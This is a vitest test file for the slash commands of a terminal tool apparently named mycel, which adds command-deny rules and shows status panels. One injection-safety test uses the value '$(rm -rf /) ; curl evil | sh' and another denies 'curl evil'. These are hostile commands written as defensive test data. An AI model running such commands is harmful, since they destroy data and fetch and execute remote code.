import { existsSync, mkdtempSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import { beforeEach, describe, expect, it, vi } from 'vitest';

import type { SlashCommandHost } from '#/tui/commands/dispatch';
import type {
  SubstrateJsonResult,
  SubstratePaths,
  SubstrateRunResult,
} from '#/tui/commands/mycel/substrate-runner';

const runner = vi.hoisted(() => {
  const paths: SubstratePaths = {
    dataDir: '/home/.mycel',
    substrateDir: '/home/.mycel/substrate',
    binPath: '/home/.mycel/bin/mycel-substrate',
    gateBinPath: '/home/.mycel/bin/mycel-gate',
    delegateBinPath: '/home/.mycel/bin/mycel-delegate',
    dbPath: '/home/.mycel/substrate/mycel.db',
    auditPath: '/home/.mycel/substrate/audit.jsonl',
    proposalsPath: '/home/.mycel/substrate/proposals.jsonl',
    configPath: '/home/.mycel/config.toml',
  };
  return {
    paths,
    runSubstrate: vi.fn(),
    runSubstrateJson: vi.fn(),
    resolveSubstratePaths: vi.fn(() => paths),
  };
});

vi.mock('#/tui/commands/mycel/substrate-runner', () => ({
  runSubstrate: runner.runSubstrate,
  runSubstrateJson: runner.runSubstrateJson,
  resolveSubstratePaths: runner.resolveSubstratePaths,
}));

// Preserve real fs (the suite writes temp files) but stub existsSync so the
// substrate-db presence checks are controllable. Defaults to present.
vi.mock('node:fs', async (importOriginal) => ({
  ...(await importOriginal<typeof import('node:fs')>()),
  existsSync: vi.fn(() => true),
}));

import { showCandidates } from '#/tui/commands/mycel/candidates';
import { handleDenyCommand } from '#/tui/commands/mycel/deny';
import { showImmunity } from '#/tui/commands/mycel/immunity';
import { handlePromoteCommand } from '#/tui/commands/mycel/promote';
import { showSubstrateStatus } from '#/tui/commands/mycel/substrate';

interface PanelLike {
  render: (width: number) => string[];
}

function makeHost() {
  const panels: PanelLike[] = [];
  const host = {
    state: {
      transcriptContainer: { addChild: vi.fn((panel: PanelLike) => panels.push(panel)) },
      ui: { requestRender: vi.fn() },
    },
    showError: vi.fn(),
    showStatus: vi.fn(),
  } as unknown as SlashCommandHost & {
    showError: ReturnType<typeof vi.fn>;
    showStatus: ReturnType<typeof vi.fn>;
  };
  return { host, panels };
}

function jsonOk<T>(data: T): SubstrateJsonResult<T> {
  return { ok: true, data };
}
function jsonFail(kind: string, message: string): SubstrateJsonResult<never> {
  return { ok: false, failure: { kind: kind as never, message } };
}
function runOk(stdout: string, stderr = ''): SubstrateRunResult {
  return { ok: true, stdout, stderr };
}
function runFail(kind: string, message: string): SubstrateRunResult {
  return { ok: false, failure: { kind: kind as never, message } };
}

beforeEach(() => {
  vi.clearAllMocks();
  runner.resolveSubstratePaths.mockReturnValue(runner.paths);
});

describe('showImmunity', () => {
  it('mounts a panel for an empty antibody list', async () => {
    runner.runSubstrateJson.mockResolvedValue(jsonOk([]));
    const { host, panels } = makeHost();
    await showImmunity(host);
    expect(panels).toHaveLength(1);
    expect(host.showError).not.toHaveBeenCalled();
  });

  it('soft-errors on a missing binary', async () => {
    runner.runSubstrateJson.mockResolvedValue(jsonFail('missing-binary', 'mycel-substrate not found'));
    const { host, panels } = makeHost();
    await showImmunity(host);
    expect(panels).toHaveLength(0);
    expect(host.showError).toHaveBeenCalledWith(expect.stringContaining('mycel-substrate not found'));
  });

  it('soft-errors on a missing db without creating it (reads as disarmed)', async () => {
    vi.mocked(existsSync).mockReturnValueOnce(false);
    const { host, panels } = makeHost();
    await showImmunity(host);
    expect(panels).toHaveLength(0);
    expect(runner.runSubstrateJson).not.toHaveBeenCalled();
    expect(host.showError).toHaveBeenCalledWith(expect.stringContaining('not initialized'));
  });

  it('soft-errors on a non-array payload', async () => {
    runner.runSubstrateJson.mockResolvedValue(jsonOk({ not: 'an array' }));
    const { host, panels } = makeHost();
    await showImmunity(host);
    expect(panels).toHaveLength(0);
    expect(host.showError).toHaveBeenCalled();
  });
});

describe('showCandidates', () => {
  it('mounts a panel for an empty candidate list', async () => {
    runner.runSubstrateJson.mockResolvedValue(jsonOk([]));
    const { host, panels } = makeHost();
    await showCandidates(host);
    expect(panels).toHaveLength(1);
    expect(host.showError).not.toHaveBeenCalled();
  });

  it('soft-errors when list-candidates fails (missing db)', async () => {
    runner.runSubstrateJson.mockResolvedValue(jsonFail('nonzero-exit', 'substrate db missing at …'));
    const { host } = makeHost();
    await showCandidates(host);
    expect(host.showError).toHaveBeenCalledWith(expect.stringContaining('substrate db missing'));
  });
});

describe('showSubstrateStatus', () => {
  it('mounts the marrow panel on success', async () => {
    runner.runSubstrateJson.mockResolvedValue(
      jsonOk({
        antibody_count: 2,
        sentinel_event_count: 1,
        audit_bytes: 100,
        audit_lines: 4,
        last_maintenance: null,
      }),
    );
    const { host, panels } = makeHost();
    await showSubstrateStatus(host);
    expect(panels).toHaveLength(1);
    expect(panels[0]!.render(80).join('\n')).toContain('2 active');
  });

  it('renders failures AS a panel (soft), not a thrown error', async () => {
    runner.runSubstrateJson.mockResolvedValue(jsonFail('missing-binary', 'not found'));
    const { host, panels } = makeHost();
    await showSubstrateStatus(host);
    expect(panels).toHaveLength(1);
    expect(host.showError).not.toHaveBeenCalled();
  });
});

describe('handleDenyCommand', () => {
  it('does not spawn on empty args', async () => {
    const { host } = makeHost();
    await handleDenyCommand(host, '   ');
    expect(runner.runSubstrate).not.toHaveBeenCalled();
    expect(host.showStatus).toHaveBeenCalledWith('usage: /deny <command-pattern>', 'warning');
  });

  it('passes the pattern as a single un-shell-escaped argv element (injection-safe)', async () => {
    runner.runSubstrate.mockResolvedValue(runOk('{"id":"c4fdb21b-0000","outcome_preview":"refuse"}'));
    const { host, panels } = makeHost();
    const pattern = '$(rm -rf /) ; curl evil | sh';
    await handleDenyCommand(host, pattern);

    expect(runner.runSubstrate).toHaveBeenCalledTimes(1);
    const [subcommand, args] = runner.runSubstrate.mock.calls[0]!;
    expect(subcommand).toBe('antibody-add');
    expect(Array.isArray(args)).toBe(true);
    const patternIdx = (args as string[]).indexOf('--command-pattern');
    expect(patternIdx).toBeGreaterThanOrEqual(0);
    expect((args as string[])[patternIdx + 1]).toBe(pattern);
    expect((args as string[])).toContain('refuse');
    expect((args as string[])).toContain('hard');
    expect(panels).toHaveLength(1);
  });

  it('soft-errors when antibody-add fails', async () => {
    runner.runSubstrate.mockResolvedValue(runFail('nonzero-exit', 'substrate db missing at …'));
    const { host, panels } = makeHost();
    await handleDenyCommand(host, 'curl evil');
    expect(panels).toHaveLength(0);
    expect(host.showError).toHaveBeenCalledWith(expect.stringContaining('substrate db missing'));
  });
});

describe('handlePromoteCommand', () => {
  function writeProposals(lines: string[]): void {
    const dir = mkdtempSync(join(tmpdir(), 'mycel-promote-'));
    const proposalsPath = join(dir, 'proposals.jsonl');
    writeFileSync(proposalsPath, lines.join('\n'));
    runner.resolveSubstratePaths.mockReturnValue({ ...runner.paths, proposalsPath });
  }

  it('lists pending proposals when no id is given', async () => {
    writeProposals([
      JSON.stringify({
        id: '25a6ea3d-1111',
        created_at: '2026-07-01T00:00:00Z',
        signature: { command_pattern: 'quux' },
        remediation: 'review first',
        rationale: null,
      }),
    ]);
    const { host, panels } = makeHost();
    await handlePromoteCommand(host, '');
    expect(panels).toHaveLength(1);
    expect(runner.runSubstrate).not.toHaveBeenCalled();
  });

  it('soft-errors on an unknown id', async () => {
    writeProposals([]);
    const { host } = makeHost();
    await handlePromoteCommand(host, 'deadbeef');
    expect(host.showError).toHaveBeenCalledWith(expect.stringContaining('No candidate matches'));
  });

  it('signs a matched proposal with its signature flags', async () => {
    writeProposals([
      JSON.stringify({
        id: '25a6ea3d-1111',
        created_at: '2026-07-01T00:00:00Z',
        signature: { command_pattern: 'quux' },
        remediation: 'review first',
        rationale: null,
      }),
    ]);
    runner.runSubstrate.mockResolvedValue(runOk('{"id":"a13cce1e-0000","outcome_preview":"warn"}'));
    const { host, panels } = makeHost();
    await handlePromoteCommand(host, '25a6ea3d');
    expect(runner.runSubstrate).toHaveBeenCalledTimes(1);
    const [subcommand, args] = runner.runSubstrate.mock.calls[0]!;
    expect(subcommand).toBe('antibody-add');
    const cmdIdx = (args as string[]).indexOf('--command-pattern');
    expect((args as string[])[cmdIdx + 1]).toBe('quux');
    expect((args as string[])).toContain('--source');
    expect(panels).toHaveLength(1);
  });
});
